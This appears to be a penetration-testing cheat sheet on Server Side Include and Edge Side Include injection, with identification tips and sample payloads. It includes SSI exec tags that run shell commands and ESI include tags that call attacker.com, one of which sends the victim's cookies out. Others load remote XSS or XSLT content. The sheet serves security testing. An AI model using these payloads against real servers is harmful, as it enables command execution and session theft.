# Server Side Include/SSI
Server Side Include is a language-neutral web server technology that supports creating dynamic content before rendering the page.
## Identification
- Does the application makes use of  `.shtml`, `shtm` or `.stm` pages
- Try Sample Payloads

## Sample Payloads
```
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DATE_LOCAL" -->
<!--#include virtual="/index.html" -->
<!--#exec cmd="dir" -->
<!--#exec cmd="ls" -->
```


# Edge Side Includes
Edge Side Include (ESI) has a form of xml tags, which are dynamically added to cached static content in order to enrich them with some dynamic features.

The ESI tags are injected by cache mechanisms for other cache mechanisms; however, if a user is able to add ESI tags to the HTTP request, the proxies might parse it without knowing its origin.

## Identification
- Check for the header `Surrogate-Control: content="ESI/1.0"`

- In order to detect ESI injection with a blind approach, the user can try to inject tags that cause the proxies to resolve arbitrary addresses resulting in SSRF.
```XML
<esi:include src="/weather/name?id=$(QUERY_STRING{city_id})" />
```

## Exploitation
- It might be possible to include a HTML file resulting in XSS
```XML
<esi:include src=http://attacker.com/xss.html>
```

- Steal Cookie, This bypasses HTTP only flags
```XML
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
```

- Include XSLT file, if supported
```XML
<esi:include src="http://attacker.com/file.xml" dca="xslt" 
stylesheet="http://attacker.com/transformation.xsl" />
```

> There is also a possibility that the ESI Injection might lead to Remote Code Execution when it has support for XSLT. Check [[Web Applications testing/Attacks/XSLT Engines]]